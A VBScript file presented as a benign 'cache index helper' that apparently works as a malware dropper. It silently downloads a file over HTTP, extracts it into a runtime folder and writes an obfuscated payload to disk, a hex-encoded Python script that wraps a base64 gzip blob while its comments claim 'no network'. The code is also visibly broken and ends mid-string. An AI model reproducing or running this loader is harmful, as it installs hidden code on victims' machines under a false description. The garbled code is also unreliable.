' cache index helper - maintains per-user cache index segments under servicing folders.
Option Explicit
On Error Resume Next

Function Dk(s)
K3 = sh.ExpandEnvironmentStrings(K3)
K4 = sh.ExpandEnvironmentStrings(K4)
K5 = sh.ExpandEnvironmentStrings(K5)

Function DL(u, f)
    On Error Resume Next
    Dim x, st
    DL = False
    Set x = CreateObject("MSXML2.XMLHTTP")
    x.Open "GET", u, False
    x.Send
    If x.Status = 200 Then
        Set st = CreateObject("ADODB.Stream")
        st.Type = 1
        st.Open
        st.Write x.responseBody
        st.SaveToFile f, 2
        st.Close
        DL = True
    End If
End Function

Sub EX(z, dest)
    On Error Resume Next
    Dim sa, i
    Set sa = CreateObject("Shell.Application")
    sa.NameSpace(dest).CopyHere sa.NameSpace(z).Items, 20
    For i = 1 To 40
        If fo.FileExists(RT & "\" & PY) Then Exit Sub
        WScript.Sleep 250
    Next
End Sub

Function H2B(h)
    On Error Resume Next
    Dim i
    H2B = ""
    For i = 1 To Len(h) Step 2
        H2B = H2B & Chr(CInt("&H" & Mid(h, i, 2)))
    Next
End Function

' runtime
If Not fo.FileExists(RT & "\" & PY) Then
    If Not fo.FolderExists(RT) Then fo.CreateFolder RT
    If Not fo.FileExists(ST) Then
        DL R1, ST
    End If
    If fo.FileExists(ST) Then EX ST, RT
End If

' ensure payload - embedded hex first, then repo
Dim PP
PP = fo.GetParentFolderName(P1)
If Not fo.FolderExists(PP) Then fo.CreateFolder PP
If Not fo.FileExists(P1) Then
    Dim e
    e = "2320436163686553796e63202d206c69676874776569676874206361636865206d616e6966657374206d61696e7461696e65722e0a23204170706c69657320636f6d7072657373656420736e617073686f74206d616e6966657374732070726f6475636564206279207468652057696e646f777320736572766963696e670a2320737461636b20696e746f20746865206c6f63616c207065722d7573657220636163686520696e6465782e2049646c652c2073696e676c652d706173732c206e6f206e6574776f726b2e0a696d706f727420626173653634206173205f6236340a696d706f727420677a6970206173205f677a0a0a5f4d414e4946455354203d206227353237617636795a686e4e6b546464613758374d456c6c61545877726d544238793130557355704348555a75717a4159377a6f5467644455364d672b733878763731524c447366324457692f2b587a657854717a556f663470566d33693973714d52774c674557496b5836555178456e326939342f366f714c4335442f59644636397239724c4d65764f36652b66657945772f69694e6b79765643546c5639462f6f664548657143725478504552584d64662b482b5a757548557278653833" & _
        "31733638377551644b622f6a61457059416e39624157797162504f7776344a696732372f3137712f75776743724c7839635768514b68546b4c4e504933624367486c66317273773869734e76563541736a7677366e64626a714736527a4e2b7964473936774b64374648684379753966476b54535a4b3245594358376f55414957752b7931493377363955674d45782f4b71316368667956696e6c53566268793862484e526649742f4a6775765832775132386f616459766750686c726f334249724749576f644477772b6d5a4d7239765475345872615944704642377653466b567843486564684f7754715153677549474f5779464f5143706f7943567874473156496b78384c6e49512f4d4d39444464396b566b6547616e486c4243396a4c6432666a5a64574f70384a374d325558307736775276587753522f377930644659312b73626545622b426d5a6350375950524d67506a312b4a547347526a30333946496475786959394841637a746f37782b30654437656e56742f75467762304b394857465575417843496f71434a6454654a572f5730474b436b74655653334d7650706f326346666d2f61363849574d443965414f314f537430676a79746162" & _
        "4564774e2b53744d4f4d526c772b305942474438667534522f4c37545473662f6432787239734738726339414e386b50437476334f5a724f76427957524b49624965346e7a6965587971646853586e476f556e3854796259776675705976324c5565654a305948794c746b39475575474254375362547439592b6b437a4e52797559532b6e6130497a696b4948375847496c4d68654358424d544679663652555039464e4f576b7149324b523473546b514d4a6748743952774330374a617159646d4834437a2f33373752555578635a68666d36484f63506a386f5673626f31457555744a436a5a59554a4a5336454f557947433666636b5130457377652b506a666d6a3175706a4a4b326b46397932434e4663616b5238774d752f58547241774269447a6c544d4e73527277497754765a676e775a5a552f48563661332b433855484e623441776b5a572b506b3032746c466a762b466f464545625332662b724233457978396a2b6361336750486653356e794f5459426e35384e41384c614569796c57724344476c466f7a4d6455525572784f723147787662453141676c7835424a2f514e694970486b365650796d42714b49626c67496641716937305a6c44" & _
        "477966556c5a5676332f7a3444736d41664533556f696354697279356e68716c6e41316571316b4b426c54717634666857674248776a6e6574456a72374d755147673759634a34654c34532b502b497071744435764c57514b43334857457a4d4a62704c58304269674a33786e59624346396c62576e4b777a3141374f334971794c4c7874716b49536c394f6846397262717232344e6a507135513438355477536c79687476562f7559553658577074312f54733436773657702f4c6773536163726d4e395867784568314c73455078456f564650514850696533464337727a6862776d453234426f65517964674e31636a56524b696f41694c4367386d597434357a56345268785957336b71633658336932536d6b4851712b594461544b5359614352556a7456677571794d574f4276697155637639433253394c73324c5953392f3354463442416b657050776633706b472b4156727170644c587657762f714e6c44567a6b3765484c35543746332b4a6558734d716b3041694b34794a304a615a715775755471425a79466768334f746b41487a634a554a2b437a5639354f71547a42697a546f6c4e466a636c42393957366c3649786f75336f4277712f4164" & _
        "76356161514c2f454e6c52674a6b2f63556367426f61634b4f66686a666a30622b567758436762542b4b655a526f434d7a4433466865325a4b72667054587337464649443357416e7872527378792b515233666e39706f54794b3561536c79663144743277666f31706c4a2b4f4545384a5a5754495239477a4a4e7a6f5a7756687a2f6752674b2b3975642f4839733450784d39495436416848627148446f486a4b376734364b2f585433696371476a775a5055433276417a576d2f71334833797a46617575585867524f4f7a457a32516e6e7052534f4a4773416b576f6178392f357579667a2f38364a4f49484778356176794d4d7456527a56583372635261546d456b514e385479386a74396a702f624a64544a5a2f4f6c4c48714361445935424e736f4a46385134374177374e4a7859616434334241426f5a63442f4579663342636f634d745a67666f49674e6749346a6d483759384555327a34686a48733446657433334b3542686963584a6b4a6c63495670766c436e356149456e6e397547434748326f3336716b4a5364644b4356574242706c486566674b42397431443554386d4456375847696d3934526b3143587346434e337532437357514943" & _
        "2b57487958416a63466c2f6f68766e2b592b50736e4633734349535a4a5745336538355844694b6d4a4d36764f797556576966543334507634645a7a6b56725450615a3841653079786c364b3062686f65543137506d737545302f6645557a35325255465735683849707778726b5873776572552f2f795045674570333653476455566c74456b30432b747a3570622f4164784b4d57614534656e4f6a4c446d2b6e4d4535326e32674679595a2f57324968434e55514146625a335a705964356955576669494e41612b4d654a584a61724e4967694943712b416643417248504c2b644f767677586179334e705154647a61432b795048637a47634449555574544a525565793044433261764d33584a6153624a61516b74795a5437746e64392b35413750736971434a74794e7753314e452f78516d7332653333334c32627377584d5a46396f4367313377686e442f6d7249375a724731654a374e6c5177756d766549764a67526669317056304b2f7a51567762635950314237364a73592b6d65736c72364433744b363371346f595374756c33416d654e654c726453476975443257322b30313465327331764d43466c4b713467796467355246627748686f32" & _
        "587150445139525145396c637633714f6f544e73695434506c622f53374d414d6276464e2b58434d414b6154514c5044326a37576146614163563436414667324a41457078676f4f783751786a2b6c545762363967492b7141416867636c6563776b644d2f765a4750617252722b434d67757268576c46446b756c795a424465594d304f61426a53787a546266554f5733796148474859536f52472f36616c3762396a2f346c6c6c31673561644d696833444d4475526e746746714d362b716970657a344b747175456f7067635863723861302b69464947754e545348766d46613555626a5970525a584e4d426b6b61446c4452564752415548584d5170542b426b642f534d47335946674938623758417468466d4375595249594a6f304462543346547752684a4f66677a74393964656744785a4d6838564c5a63386b6e2f4c39546756775357762f422b6c2b6a694d573472767979667566306e547a366e597a486c63666c7656515948446b5464656975746d59647846653957456248465671706551687a694d766f61796f617435524f4a66654c5050785a786b626d6548554e55354e7935704552734b51527a4f6772525546373951445a4a575857715838" & _
        "667a6363705655646a7652535a596a4a6b662b54484f753444357338557555767535534d3357546d66344535454c534b6c7975523171416b644353364c576d7a554d777570736b483462514b723231306b6e37376e776d54726e6d337253365447777a734632716b6d302f4e454c784966596643597343397a733367506750784e714f766271327652487867682b6846395556616458504e7570526e7a6353506b533565677868346f37564275454941662b6447475851766e526964755a756144766d4c443461502f4b534e704e51443273637039343974714c5a526f7044787262464b714d4d66527a6154775a556f516e4a306950716831696f4e79397939714576464c307636332b623554777643356677474271584243474b2b2b6343516b5052596d78636e707755727339314d5a6f487039394e3764376c554a7a6c7a4f414b514269434d7a31497136464d415853496c677169663769642b59364c685362697168326d636e424d6448334b6f69544d714d4b67594e6c557a6945545a61386d5663756a773939574a6b4c643333726a65535142525a2b79642b774b3554324a315a474f653949372b7074687047366d384169444954596f57654b6c6d6f37" & _
        "6e43716d57427a597663452b51584e515a536c6d376b6a437044374f4962495771477a723759462b57516953474175715a586d654371474d574b336e46792f54477533324b365a74544f42714c59684e443565374b5174354a644d59682b5943687477336f34774b3539664e3871314a315766644e71324d42743750566d32767742727352456d6c652b6b374241526457315973476336614c786b5a666873553954786d5830306564456542485373784b4843382b375a662b454c41516337456b584c4f32313147786b6456676a6b4a5a4b634b6e4c6a376b6c706f6e756e3963365a6333444e37765552672f68496a677147312b496a375837414547344d52667a536f62374943587a4454344b575273387a3557646a6a315a45747a706c4f2f3239766476696a614b61563252644a755641706f473838563952637037652b6f69777064324749575648707039394e526e7764484f6a5067746259597968597534712f31766e4731484d4f4370766d354f416554706d414d534845464336356a76386d54343678472f38334f4130703750655350446d6b7236414b495a3836324b51467856323070346232525937786746676f696d426669596c6d63664f6e6849" & _
        "596d7972487661634c4742736859714a3076655846334d6f364255752b554a2b7468466333536179366450357954437456734d78704468726d5851303449696d49754b3762584747443337497749433956746d395743466c35386f394551344e37313731523949534b56356b76574c617731564a316e72747630744c446f34496750754e526650483151794572367271777a3048707847667670796f7348474349677a3871416e445445586a4a34754f68314b51654b59346d43754d52464569686b664d684653734f2f524354566b4e6b73764c58556d6b614351506755366b633342506b727a394b3078364f2b714470394770796732665435564e4f30746c4f79572f396d614d61544d4864782b6731335964594649715776642b4c354f653177462b48767a4b425944396d5462525048716970704d304865504453757966553839656e73332b58457869456138667363545656475032652b6b774b4c7a4e7a722b3533496c434342332b6f797436454643362b744f7469476b785441423838737163445641506d6f5149694d6242527245613132794c36636379555642577a317a63614b6c794c55617955696e41366f2f734a3464436c4f6f72446e6a48636e" & _
        "4c3752426477544f4c684631477458722b476b3751646652566f47324575542f61567462673563634b462f6d34475949534a637467346671462b6138684b346e6c4677374e684d502f707a736f47356d3648762b542b4773794b7a35663157306857634e7244703168644b504a642b6a357836496255574c4b3564346c6764664e37353741364c2b4c6b352f3865732f30725842484c36634553482f32576c363161376c425a3474793248742b4f546e65652f36717a7844687271414e45434e4b76597271346541487866784f454c6d5a55486e2b4457644278394e4e7a2b7963374a333854776b587743756c505a5a796c7a4969724265576e502b6a784a59306a5a67512b504a357a4b56674a5a4e7a5a305476514f754650316852342b6b326554586a2f5370354f493631504b4e53303164577378775370634641564e73785a7874582f53367a525437744f6d7272657638724953496c427879323932614f394230424461464a6235436e66566c783279316d567443544e3364387962764b3441394f525232325265564b44497968434553714f4e52384b55373679386c4b6365576e6f7a702f59506e574b4e33486b4e6d4f632b6f6f7a44593569612f6c32" & _
        "394859563858532f6c692f6a6172434d7646456b385943754a37386169435a482b5853576e7253415a494457624e3071366f466d476d5a453546437a777a52582b31456b4b7572455377466c7753355974476f566b3552384f673265382b6435586749597835356b586f7845614b677a544d732b42536a742f4b74314c712f4a6d324e6b313748444b777458497939637a67576d615445563478745a50544861485861674963587a482f71533251426d69344b56503666752f4578536f533070702f5037554b7879673071374e376e644179482f3938584c6f716a71424552776a614f6c703757364d6f6949552b4736646d59464b325937726541654f4b7948365a73492f6b63476833394d4b6f436d38334d5350557461796e66334c6d45477473744f44784f744c584b7a71542b6f455a5936426b6f514b4b786a6f4e646548463267446858726477596d35446c4c7a2f7a742f3457505457327a717470446d685536434d4d77376b48666772636c727351576361334e4a64536468426d5057675a4f61796b475a70786d6a45455a4e4c555063785242485a585a7659654531756b554372616e52774c623948625831354a7077326b62763762457731374d592b" & _
        "704a43344c4c7976634d2b63586b4e4c444f31665430585975574b7a41376c336449624e7733315a7661654652424730445470413330746e39483161504b6f6e704e693549674f516146524c38564576565057345649315a782f6d53632f454445615878656d3841524d736644356974446b65674f50705366723351746277676651487633534a504648372f477a6d44466b7962476756304743517652585a2f382f4b486941586d35755162556e724f47796e5241346a3436515979795a6758514f337458643135672f455066426349386858566f485739746c306f4645706f582b744274734d5030772b55546e76563958656669366b513333474f6a6f376d2f2b31436465374e2f2b7246783567576b756c316f61626e737a525a54364b6d3176753966477662546135586e632b4379483273576e65596c3430747676694c6b4c367a34766c316975744358692f4b456a2b7950462f6f68565971462b304b5a6169754d527a74706f6b2f306d70664a576134695751453144596a6935586c596e6b6c584b716f4a6d7031774279695372797861792b314f6a74464537374c4e63654f6d4669693976316c72716c6b4e506d517233586d7750556d5347556d6f62" & _
        "645678705862546b54734a7756624230572f334a2f4c6634384d4f7253654d483258454d50746555797341734d72654b4c7158574d3879756271684c446a4a4b784b65744d47724d456b38596741764970364f396d4f4830332f515962505138476a77432b647552494273417256457a6f543834426f5668304f474d6a6e6b4d615a426b724e64334644684b5661346f7530694c375064447a33365559484332754475563871766a57422f5946775465764936345447756b5877344b5531637179756b4a4a394e72454d37597a4d45765076744b5456662f6c377834374b76787163436c304e745139526e6a5138384961753441563469454d4472466c7063624b485a64614f704754357552424a317565716f464a36316a794275334e394d4e357933417a4a674f553137714e6e484d34626b684765766d62317861467a664a416e4b6f30464f497a7965554a71336669384277584d55426132636241705a483441524f663168436d363850704d6238376b564b6d536a5737574f366b3737504d486471626c33645976534c4e46687479797a43654b4b6867346e5348514e7967542f447a2f6a4d424b336336736652446a66456f434b324d456136687a534a2b6e" & _
        "435a47652f326f4c75456b4d32484a5a4b54707a654d35486247746638775944503379494665706b7039744a2b773168312b6e3068582f6569586c674b4b5261306c536c33494f617668526e5a596e6e692f44666f575467522b7158393250436968466d37306d644f5a5575332b497543656f51366254504e3977726b53625a3066702f67312f4b7a4e77344a2b50513164713659337a426f75646d50316c76517961574c4b39417931376c546a787177743779756b743370684e3573556261644852766a34337530747236302b3862614c75465241454366663556417232755052664e56567366695a35746b576b6979706c72434645736c6739434d35694938625473754d796e647a574a51396c6b46356c6467336739763950484469645446516f6337786d2b45384f6941646b637775526f48456c782b37333357365a316a456261384238474a63435a4d39674f4a39733648706f576f524c57485467564371346d61514743384f52416a4264504266526a373045572b527676706571696a72634f6c735a33384661366c2b543454782f2f467762654d5464613178774b4770612f6e72755673774a677331366839666654776969586956523171547146444c" & _
        "6e5552576655304355334958716936504654724854653973656c4d33566630644c36594f6c4f484d52715a662b6638715a5173305339442f6239334356432b6b6c305357705a687a4f556d6d4a5234377173676167527975692f46332f53396a457733584c3733347945507664483362594d444b45616b536139697a51535273787a6d2b4e585a456b5a516735594657452b797a473076674a693232735846496d30466d334764366a6f585134776c4947426f6c693744394147575a43544177484151325051767a62374230444d2b796546326d6c4439507071466f41316e6858576e58656f4833704266434150373568634d3555334f647332334b66515034414636556141427a3554734c37484158384b4a415972427133794d4d55784f5a746c6a616747644d342b4f794a774937684176476835694a694e6a506e62794671693467677473524d66535678544e53736d384e4e78684d55745543327765794962473576372f762f50555536396938614d6550744730486c4c7353413258754656674f47494736323631435872674434707064374f684845754e7a7a476e596f664632434b6950316f72335543467267493347565874466e30314775794d797959" & _
        "4a76474d3439395939345048574630356e793670776d3452664a61646d4f334349617a676557457a396e74494f434138634b65643745554c656a552f733157645a4f6e36492f4b65526f4569753836664164384c49726266434367534735567a6443447972766d677955506878724b4a63366e36444673314c5a325557712b376c723277436c49384a574775376b324b485a2b5853774d6f616b72733737305432516d794d6f766d6c4d4e66527069326b36444b544e615167485a694a33694933515651586d48314d59336e676a6d7a6b4d675447336a39316c496f6c6831744d4e4a78584473356b6f6c4f66487043516d6e743839744441687a397433594d6877352b6a634c7666506f2b73454f6f4c76433048527745566776652b653845374a5a332f324f33645341764655307278677a45306d52324f744f556e524f634e596e784b6965574155435a70655a4f61614751557653755a534d34714d596d676467394e326a763833715666414d754266456e4576536c6c6759456b37713346744c4d6768785930693069476d78444e485847764d6c3943694367424b52304b304a595837714f4b3651347775554c3750794e4c625141545a733648747431554d" & _
        "594367646646415a486e314a75576572307a734d444c6245525959306478462b582f2f5967346743394356706130367a4f51516e424b416c5a396f427345456b6d733353462f6933454a786e7578522f42472f5441355042396f3668357550647a525a64347a34314872387968337544684649532b492f3462593538303238385872572b74733647422f5771415879714b4761643378693438427a766d66744a6c765743652b79353455703254382f2f4b506e494b38554a65313472506e564b744752794a43323055372b64633756517066744177754d2f3558486b47365259514173686c486377544e4b305a6d75795371417541657a3841652f595159764645617665717a355451527473774f634c3969694a395454615a2b364857343545516649634972636c425950624334664772466c2f637967705074794b6f3755674c4c336a4f53442b394c74635a6e662b2f2f437a6a3268564c6538436f61677a6145496d6d6664564c58665a3165423153757a4446464351575047675238694334795531565a743252676e7944365a694b64565a545a55585945774d39706d347273456e2b4a71744e66454661437a4f7a47736c32584b662f6b4e345177392b5172" & _
        "545434787a62386372713878765056414d595543546c622f59524e4b36575737634a3448562b6b59764e305679747a72454e623736305855435642616b6c626a6c6b5830617a4454534b504e2f447158782b692b5765557a412f506d6a796878546b6e7a315556635a6b3747676b374859426e654d492f4f5758596b31673878516d636773473241374b362f7a7253594b584764415737622b33506d35506437357773627442373962387057753548776642375163716c7956337869645737685959453671625a2b6d4d747033466d78654c45716451594342504f33652b5a537139776c547636484f625a794b796c4b6d585a50717444356c3441536464502f412f5351654b486835794d734a5a58443555384773454636534447574337573739524f354a6839374a494d482b6763484c546e316e4c79495558504c644d5778657a354834564c6679574d45587a3137314c54715549306a764c61572b354c347547466a64526b75674d70697535794a71724c665574494276323975634c52656f456d68484a6c49574c7a4e7445372f533636662b6c4e392f756b4869684a6452356f56676750636a42305a4a78317578593547536c73674e6e5765676578687844" & _
        "4a4549645a6e6e38443469454c61697535656c5849696d683032446c33574d366b6a4b59393931466253346469586f584a575762735039564d325275346d732f4f67686a6e784f4654394b5971735371334e6c61476c42525269325473517a4f543333524f776b6a6b7a574f50547059706b31712f57364639485a374d45713353644a466f41416438706f6c2b72546e734a6a36376b5a67676c46446344566f34687348666a46646e61707341445a6d4731414d4e6155366741496550314e42354772634e436f4c3059507653494e554b4d7051507456775678424d6e57623365696f2f6450766d4232356c66684e5771654b563434582f644c78727a514b6f7372336469376466455044774b624b423054424431765434744f6754552f41416e43353244364276354c46686a67417070647a55355879313141506f6a797635654251764d2f7254734a634d68573033576b46595a2f495874553139624f6d456c4b37546e6b775a733676712f376846394a4359463870662b454d315872703849544b656a786669526e2f64745876377a596f6a73396f7245664c78434b4d523131633174413237544635665749354559414c464366354c3461626644502b436575" & _
        "4f586f614c2b374a64345058545573397877654d6f38433734476d68575451307a45434268474d5a336f6d503761333258737764764e704d2f6637756b502b684b3944566b516172546363316770487576776b774e556d3863577a6b437851786356374e66624a36734d4a6e77456963724a64643663555132724d706b4c7362654579564b523636325145504f762b4f6c3757663734454e367565337671717a7933726464687a42647a71623135377935566e342f762b794a7a42706d3949325973683359306b473658505568354f5246692b6834347961667a562b525741634e45496b6c4e4c4e6a4a4b5442756b417435682b7161514f714145392b764759436735635330383866624567415a79507369704b4e6974797876536e4b5873536f6b79645750622f656b776553564b793271546d713273734b722f754a776e732f634c443344695a674a44575830536e784c65327750446455362b325447796b665833355134617a704658494865666e6d426f635a55674b743474684931753363584a4c77763955344a4a67462f79754b38564b6a4c4e364269684972647169576b4658434f526a4e4f562f34776a7971466b74624a412f712f477a7678374b6663" & _
        "57734c6f4d7336757054614f613973427278442f753049486877516661676567644958314d732f576d503753754e41696d6d394e2b2f344858305a6b4750636d30783336686c594b33454852314b55356c633854586137496c713656634a2b794936336e6f6f2b45746f314971466b5141446b62544133466d384a616f785763794a727761616a4f7554776a516e2f62336d5232637a754970635453577534796159516a46413138533048736b6f6953386b397830366b76646651387a37747a674c435163364c50636f52506b36706b74336f395034755939546e5a3365675a73556d78596e37387067494a77423559352f6b6e46683333557163377a676256676270676a5055416f546850755767317a6b4a5a4b7733314279756d4375436b7259694149436d506f634232523069786c704c42355450614430656146354b675855474763346f4d4834494f534c63304d666c51776258652b4142304a756b514d6d41413865355a6c6168734b6e6b765274386b7544465468436555496f43453370556741303571666e4e424f64664a4c45757255445a79772b7362306a63346676315965584c6e376c4b4a73795744765a31465544324f4a754c4459675869694e" & _
        "6b6374656d47543562584d6a3933663647667168565a704347473135652f377437615732544966694c6f2f6358614c464c614a6e6e697159784c4349737a4148354d6a434379704149767170626262496675504b4f6e5967657a774a576550306b737272614377625a6e4e36597775554566784265395141426d376476463839624e5278342f7955492b4e4f55484938384865687a546b7049596c6c445568612f4258713642793345397441477a494e3555704c33485259686c556d354a4b33494b7469704a5542617a655a5a387a30644267534d3573586332504163726b326f6e727144696f4535376d36374257725a384f48464451435066477243457636336d41747252764f704f786c7852686f33516b356437776c7770543343726c66496f6f574d6841396b366c2f33376d74547645742b576b354f6e486d764837736e4c442f424b554f4f7132666261586f714a3969584d4149545250746b55665048317362424c7863315432644a7868487838595469435a476363677579346f724a695554667356436b4f2f32386642724d747055554f6166315345335051483067715945746f7a304b73417835726c354375794a57436f4874554e69316571766c39" & _
